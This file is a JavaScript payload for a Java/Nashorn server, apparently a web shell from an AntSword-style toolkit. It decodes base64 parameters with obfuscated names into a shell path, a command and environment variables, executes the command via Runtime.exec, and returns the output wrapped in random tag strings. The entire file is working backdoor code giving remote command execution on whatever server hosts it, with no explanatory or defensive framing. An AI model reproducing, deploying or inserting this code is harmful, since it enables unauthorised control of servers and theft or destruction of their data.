try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
var output = new StringBuffer("");
var cs = "UTF-8";
var tag_s = "193668e4c666";
var tag_e = "b6964231";
try {
  response.setContentType("text/html");
  request.setCharacterEncoding(cs);
  response.setCharacterEncoding(cs);
  function decode(str) {
    str = str.substr(2);
    return byte2Str(Base64DecodeToByte(str));
  }
  function Base64DecodeToByte(str) {
    importPackage(Packages.sun.misc);
    importPackage(Packages.java.util);
    var bt;
    try {
      bt = new BASE64Decoder().decodeBuffer(str);
    } catch (e) {
      bt = new Base64().getDecoder().decode(str);
    }
    return bt;
  }
  function byte2Str(bt) {
    var result = "";
    for (var i = 0; i < bt.length; i++) {
      result += String.fromCharCode(bt[i]);
    }
    return result;
  }
  function asoutput(str) {
    return str;
  }
  function ExecuteCommandCode(cmdPath, command, envstr) {
    var sb = new StringBuffer();
    var split = isWin() ? "/c" : "-c";
    var s = [cmdPath, split, command];
    var readonlyenv = System.getenv();
    var cmdenv = new HashMap(readonlyenv);
    var envs = envstr.split("\\|\\|\\|asline\\|\\|\\|");
    for (var i = 0; i < envs.length; i++) {
      var es = envs[i].split("\\|\\|\\|askey\\|\\|\\|");
      if (es.length == 2) {
        cmdenv.put(es[0], es[1]);
      }
    }
    var e = [];
    var i = 0;
    for (var key in cmdenv) {
      print(key + "=" + cmdenv[key]);
      e[i] = key + "=" + cmdenv[key];
      i++;
    }
    p = java.lang.Runtime.getRuntime().exec(s, e);
    CopyInputStream(p.getInputStream(), sb);
    CopyInputStream(p.getErrorStream(), sb);
    return sb;
  }
  function CopyInputStream(is, sb) {
    var l;
    var br = new BufferedReader(new InputStreamReader(is, cs));
    while ((l = br.readLine()) != null) {
      sb.append(l + "\r\n");
    }
    br.close();
  }
  function isWin() {
    var osname = System.getProperty("os.name");
    osname = osname.toLowerCase();
    return osname.startsWith("win");
  }
  var cmdPath = decode(request.getParameter("z76afa9beb9da8"));
  var command = decode(request.getParameter("v4fd973d3730d8"));
  var envstr = decode(request.getParameter("dfdc88378cc5a2"));
  output.append(ExecuteCommandCode(cmdPath, command, envstr));
} catch (e) {
  output.append("ERROR:// " + e.toString());
}
try {
  response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e);
} catch (e) {}
